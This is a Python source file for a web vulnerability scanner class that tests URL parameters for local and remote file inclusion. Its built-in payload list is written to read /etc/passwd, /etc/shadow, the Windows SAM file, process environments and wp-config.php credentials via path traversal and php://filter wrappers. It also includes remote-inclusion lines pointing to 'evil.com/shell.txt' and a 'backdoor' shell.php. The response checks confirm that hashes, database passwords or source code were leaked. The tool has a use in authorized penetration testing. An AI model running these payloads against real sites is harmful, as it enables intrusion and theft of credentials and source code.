import requests
from urllib.parse import urlparse, urlunparse
import re
import base64

class LFIScanner:
    def __init__(self, url, args):
        self.url = url
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies:
            for cookie in args.cookies.split(';'):
                if '=' in cookie:
                    key, val = cookie.strip().split('=', 1)
                    self.session.cookies[key] = val
        
        self.payloads = self.load_payloads()
        self.results = []
    
    def load_payloads(self):
        """Load LFI/RFI payloads"""
        payload_file = 'payloads/lfi.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            return [
                # Unix LFI
                '../../../../../../etc/passwd',
                '....//....//....//....//etc/passwd',
                '../../../../../../etc/shadow',
                '../../../../../../proc/self/environ',
                '../../../../../../proc/self/cmdline',
                '../../../../../../proc/version',
                '../../../../../../etc/hosts',
                '../../../../../../etc/issue',
                '../../../../../../etc/nginx/nginx.conf',
                '../../../../../../etc/apache2/apache2.conf',
                '../../../../../../var/log/apache2/access.log',
                
                # Windows LFI
                '../../../../../../windows/win.ini',
                '../../../../../../windows/system32/drivers/etc/hosts',
                '../../../../../../windows/system32/config/sam',
                '../../../../../../boot.ini',
                '../../../../../../windows/php.ini',
                
                # PHP wrappers
                'php://filter/convert.base64-encode/resource=index.php',
                'php://filter/convert.base64-encode/resource=config.php',
                'php://filter/convert.base64-encode/resource=wp-config.php',
                'php://filter/read=convert.base64-encode/resource=../../../../etc/passwd',
                
                # RFI
                'http://evil.com/shell.txt?',
                'https://raw.githubusercontent.com/backdoor/master/shell.php?',
                
                # Null byte injection (older PHP)
                '../../../../../../etc/passwd%00',
                '../../../../../../etc/passwd%2500',
                
                # Double encoding
                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
                '..%252f..%252f..%252f..%252fetc/passwd',
                
                # OS specific
                '....//....//....//....//....//....//etc/passwd',
                '..\\..\\..\\..\\..\\..\\windows\\win.ini',
            ]
    
    def get_params_from_url(self):
        """Extract parameters from URL"""
        parsed = urlparse(self.url)
        params = []
        
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    params.append({
                        'name': key,
                        'current_value': value,
                        'url': self.url
                    })
        
        return params
    
    def test_lfi_payload(self, url, param_name, payload):
        """Test a single LFI payload"""
        try:
            # Replace parameter value with payload
            parsed = urlparse(url)
            if parsed.query:
                new_params = []
                for p in parsed.query.split('&'):
                    if '=' in p:
                        key, val = p.split('=', 1)
                        if key == param_name:
                            new_params.append(f"{key}={payload}")
                        else:
                            new_params.append(p)
                new_query = '&'.join(new_params)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))
            else:
                test_url = f"{url}?{param_name}={payload}"
            
            response = self.session.get(test_url, timeout=self.args.timeout)
            
            # Check for LFI indicators
            indicators = {
                'passwd': ['root:', '/bin/bash', 'daemon:', '/usr/sbin/nologin'],
                'shadow': ['root:', '$6$', '$5$', '$1$', '$2y$'],
                'win.ini': ['[fonts]', '[extensions]', '[files]', '[Mail]'],
                'environ': ['PATH=', 'HOME=', 'USER=', 'APACHE_RUN_'],
                'php_source': ['<?php', '<?=', 'define(', 'function '],
                'config': ['DB_HOST', 'DB_NAME', 'DB_USER', 'DB_PASSWORD'],
                'wp_config': ["define('DB_NAME", "define('DB_USER", "table_prefix"],
                'base64': None  # Will check separately
            }
            
            for finding_type, patterns in indicators.items():
                if patterns:
                    if all(p in response.text for p in patterns[:2]):
                        return {
                            'url': test_url[:120],
                            'param': param_name,
                            'payload': payload,
                            'type': f'LFI - {finding_type}',
                            'evidence': f'Found indicators: {", ".join(patterns[:2])}',
                            'confidence': 'High'
                        }
            
            # Check for base64 encoded PHP source
            if 'php://filter' in payload and response.text:
                try:
                    decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'function' in decoded:
                        return {
                            'url': test_url[:120],
                            'param': param_name,
                            'payload': payload,
                            'type': 'LFI - PHP Source Disclosure',
                            'evidence': f'PHP source code extracted via wrapper',
                            'confidence': 'Critical'
                        }
                except Exception:
                    pass
            
            # Check for error messages that indicate LFI
            error_patterns = [
                'failed to open stream',
                'No such file',
                'include()',
                'require()',
                'Warning: file_get_contents',
                'failed opening',
                'for inclusion',
                'include_path',
                'open_basedir'
            ]
            
            for pattern in error_patterns:
                if pattern.lower() in response.text.lower():
                    return {
                        'url': test_url[:120],
                        'param': param_name,
                        'payload': payload,
                        'type': 'LFI - Error Leakage',
                        'evidence': f'Error message: {pattern}',
                        'confidence': 'Medium'
                    }
                    
        except Exception:
            pass
        
        return None
    
    def scan(self):
        """Main LFI scan"""
        print("    [*] Extracting URL parameters...")
        
        params = self.get_params_from_url()
        
        if not params:
            # Try to find common parameter names if none in URL
            common_params = ['file', 'page', 'include', 'path', 'doc', 'folder',
                           'root', 'load', 'read', 'data', 'template', 'view',
                           'content', 'show', 'location', 'dir', 'download']
            print(f"    [*] No parameters found in URL, trying common names...")
            
            for param in common_params:
                params.append({
                    'name': param,
                    'current_value': '',
                    'url': self.url
                })
        
        print(f"    [*] Testing {len(params)} parameters with {len(self.payloads)} payloads...")
        
        for param in params:
            for payload in self.payloads:
                result = self.test_lfi_payload(param['url'], param['name'], payload)
                if result:
                    self.results.append(result)
                    print(f"    [!] {result['type']} detected!")
                    print(f"        URL: {result['url'][:80]}")
                    break  # Move to next parameter
        
        if not self.results:
            print("    [+] No LFI/RFI vulnerabilities detected")
        
        return self.results